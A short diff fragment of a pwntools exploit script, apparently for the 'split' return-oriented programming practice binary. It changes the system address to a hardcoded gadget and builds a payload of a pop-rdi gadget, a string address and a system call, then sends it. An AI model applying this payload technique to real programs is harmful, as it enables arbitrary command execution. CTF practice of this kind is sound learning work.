@@ -153,7 +153,7 @@ p = process("./split")
     
 rdi = 0x4007c3
 str = 0x601060
-system = e.sym["system"]
+system = 0x40074b
 pay = flat({0x28:rdi}, str, system)
 
 p.send(pay)
